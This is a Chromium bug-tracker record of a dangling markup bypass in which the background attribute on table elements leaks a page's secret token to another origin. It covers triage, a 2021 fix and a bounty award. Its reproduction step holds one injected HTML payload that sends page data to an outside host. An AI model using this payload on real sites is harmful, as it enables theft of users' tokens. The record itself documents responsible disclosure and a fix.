# Dangling markup attack through background attribute allows data exfiltration

| Field | Value |
|-------|-------|
| **Issue ID** | [40051154](https://issues.chromium.org/issues/40051154) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>CSS, Blink>SecurityFeature |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | he...@gmail.com |
| **Assignee** | fu...@chromium.org |
| **Created** | 2020-01-07 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Chrome has a mitigation in place to prevent dangling markup attacks (<https://www.chromestatus.com/features/5735596811091968>) where requests containing the `\n` and `<` characters on the URL get blocked.

However, it is still possible to exfiltrate information through use of the background attribute on any of the following tags:

<col> <colgroup> <table> <tbody> <td> <tfoot> <th> <thead> <tr>

This issue is similar to <https://crbug.com/chromium/749852> and <https://crbug.com/chromium/695474>.

**VERSION**  

Version 79.0.3945.88 (Official Build) (64-bit)

**REPRODUCTION CASE**

1. Go to <https://lbherrera.me/chrome/dangling-markup/?xss=><table+background='<https://example.org/?leak=>
2. A cross-origin request will be made containing the secret token from the form.

**CREDIT INFORMATION**  

Reporter credit: Luan Herrera (@lbherrera\_)

## Attachments

- [index.php](attachments/index.php) (text/plain, 313 B)

## Timeline

### mb...@chromium.org (2020-01-08)

andypaicu: Could you take a look at this when you have a chance?

Setting severity label to match https://crbug.com/chromium/749852.

[Monorail components: Blink>SecurityFeature]

### sh...@chromium.org (2020-01-09)

Setting milestone and target because of Security_Impact=Stable and medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2020-01-09)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2020-01-22)

andypaicu: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2020-02-06)

andypaicu: Uh oh! This issue still open and hasn't been updated in the last 29 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-04-09)

[Empty comment from Monorail migration]

### [Deleted User] (2020-05-20)

[Empty comment from Monorail migration]

### [Deleted User] (2020-07-14)

andypaicu: Uh oh! This issue still open and hasn't been updated in the last 188 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-07-15)

[Empty comment from Monorail migration]

### [Deleted User] (2020-07-28)

andypaicu: Uh oh! This issue still open and hasn't been updated in the last 202 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### an...@chromium.org (2020-07-29)

Hi Mike, can you help triage this to someone more appropriate?

### mk...@chromium.org (2020-07-29)

ericwilligers: Can you help me find a reasonable place to insert a check against `KURL::PotentiallyDanglingMarkup()` (https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/platform/weborigin/kurl.h;drc=5875777d5ab5ce5244b2d84d4281ee1a95bcc3cd;l=231)? I'm not familiar enough with the processing for `background`, and I'm getting a bit lost on the way from `HTMLTableElement::CollectStyleForPresentationAttribute` to `ElementStyleResources::LoadPendingImages`. It seems like there should be some chokepoint at which we could check this attribute of the URL to be requested without doing one-off checks for each element that supports `background` (and, presumably, other presentational attributes).

If you can point me to a reasonable spot, and reassign the bug back to me, I'd very much appreciate it! (CCing one or two other folks from //core/css/OWNERS).

[Monorail components: Blink>CSS]

### er...@chromium.org (2020-07-29)

Re-assigning question to andruud.

For background, could CSSImageValue::CacheImage or CSSImageValue::ReResolveURL be used?

Note that a few SVG elements have URL attributes, should they also be checked?


### mk...@chromium.org (2020-07-29)

> Re-assigning question to andruud.

Thank you, and hello!

> Note that a few SVG elements have URL attributes, should they also be checked?

If they cause requests to be made, then yes. Is this the tip of a scary iceberg? :)

### mk...@chromium.org (2020-07-29)

Pasting in from chat for posterity: andruud@ suggested:

"""
So as far as I can tell from taking a quick look:
we don't really support _not_ loading an image.
So far I think `CSSImageValue::CacheImage` would be the best (/ least bad) place to check for your flag
But we can't return nullptr there. The rest of the code is not prepared for that.

If we were to solve it in CSS, then we could either 1) "pillage" the URL (but I guess it might look weird in the Inspector's network debugger, I don't know), or 2) we could implement a new `StyleImage` subclass which does nothing, _or_ 3) we could make it possible to return `nullptr` from `CSSImageValue::CacheImage`

I'd look into (2) first, but not obvious which is more painful of (2) and (3).
"""

### an...@chromium.org (2020-07-31)

[Empty comment from Monorail migration]

### fu...@chromium.org (2020-08-03)

I recently did a change so that we can have StylePendingImage for image resources which is not loaded because of display:none/contents. Letting CacheImage() return null in this case and keep the image resource a StylePendingImage like we do for display:none seems like a reasonable way to do this, I think.

P1 security issue should not be unassigned, so assigning to myself.


### fu...@chromium.org (2020-08-03)

Oh, wait a sec. I think we have DCHECKs that we don't have StylePendingImage if we have a LayoutObject and try to paint it.


### fu...@chromium.org (2020-08-11)

[Empty comment from Monorail migration]

### [Deleted User] (2020-08-26)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-07)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-30)

[Empty comment from Monorail migration]

### [Deleted User] (2020-11-18)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-20)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-20)

[Empty comment from Monorail migration]

### [Deleted User] (2021-02-22)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aj...@google.com (2021-02-24)

security-triage: The repro for this now 404s - it would be helpful to have a testcase attached to this issue?

### he...@gmail.com (2021-02-24)

#27: I have attached the testcase and also put back the repro on the server. Thanks for the ping!

### [Deleted User] (2021-03-03)

[Empty comment from Monorail migration]

### [Deleted User] (2021-03-11)

[Empty comment from Monorail migration]

### zh...@google.com (2021-03-17)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-15)

[Empty comment from Monorail migration]

### [Deleted User] (2021-05-17)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### fu...@chromium.org (2021-05-19)

[Empty comment from Monorail migration]

### [Deleted User] (2021-05-19)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-05-26)

[Empty comment from Monorail migration]

### [Deleted User] (2021-06-28)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-07-09)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-07-20)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@google.com (2021-07-21)

futhark@, sorry, security bugs can't be unowned... please could you figure out who should take care of moving this forward?

### [Deleted User] (2021-08-05)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-06)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-06)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-06)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-07)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-16)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-11)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-22)

[Empty comment from Monorail migration]

### fu...@chromium.org (2021-10-14)

[Empty comment from Monorail migration]

### fu...@chromium.org (2021-10-14)

[Empty comment from Monorail migration]

### fu...@chromium.org (2021-10-14)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-10-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/349a35b1966756c71ac7c5bd7857958e3d4dc799

commit 349a35b1966756c71ac7c5bd7857958e3d4dc799
Author: Rune Lillesveen <futhark@chromium.org>
Date: Fri Oct 15 14:33:17 2021

Handle PotentiallyDanglingMarkup() for CSSImageValue

The flag was lost in the KURL -> String -> KURL conversions. Store the
flag on CSSImageValue and always re-resolve from the original relative
url before fetching when that flag is set. The blocking happens in
BaseFetchContext::CanRequestInternal().

Bug: 1039885
Change-Id: Ia5777739a0ee0bee591163873926d19e0ea014bf
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3226142
Reviewed-by: Anders Hartvoll Ruud <andruud@chromium.org>
Reviewed-by: Mike West <mkwst@chromium.org>
Commit-Queue: Rune Lillesveen <futhark@chromium.org>
Cr-Commit-Position: refs/heads/main@{#932004}

[modify] https://crrev.com/349a35b1966756c71ac7c5bd7857958e3d4dc799/third_party/blink/renderer/core/css/build.gni
[modify] https://crrev.com/349a35b1966756c71ac7c5bd7857958e3d4dc799/third_party/blink/renderer/core/css/css_image_value.h
[modify] https://crrev.com/349a35b1966756c71ac7c5bd7857958e3d4dc799/third_party/blink/renderer/core/css/css_image_value.cc
[add] https://crrev.com/349a35b1966756c71ac7c5bd7857958e3d4dc799/third_party/blink/renderer/core/css/css_image_value_test.cc


### fu...@chromium.org (2021-10-15)

[Empty comment from Monorail migration]

### [Deleted User] (2021-10-16)

[Empty comment from Monorail migration]

### [Deleted User] (2021-10-16)

[Empty comment from Monorail migration]

### am...@google.com (2021-10-20)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2021-10-20)

Congratulations, Luan! The VRP Panel has decided to award you $1000 for this report. Thank you for this report and nice work! 

### am...@google.com (2021-10-21)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-01-04)

[Empty comment from Monorail migration]

### am...@google.com (2022-01-04)

[Empty comment from Monorail migration]

### [Deleted User] (2022-01-22)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2022-07-29)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1039885?no_tracker_redirect=1

[Multiple monorail components: Blink>CSS, Blink>SecurityFeature]
[Monorail blocked-on: crbug.com/chromium/1260189]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40051154)*
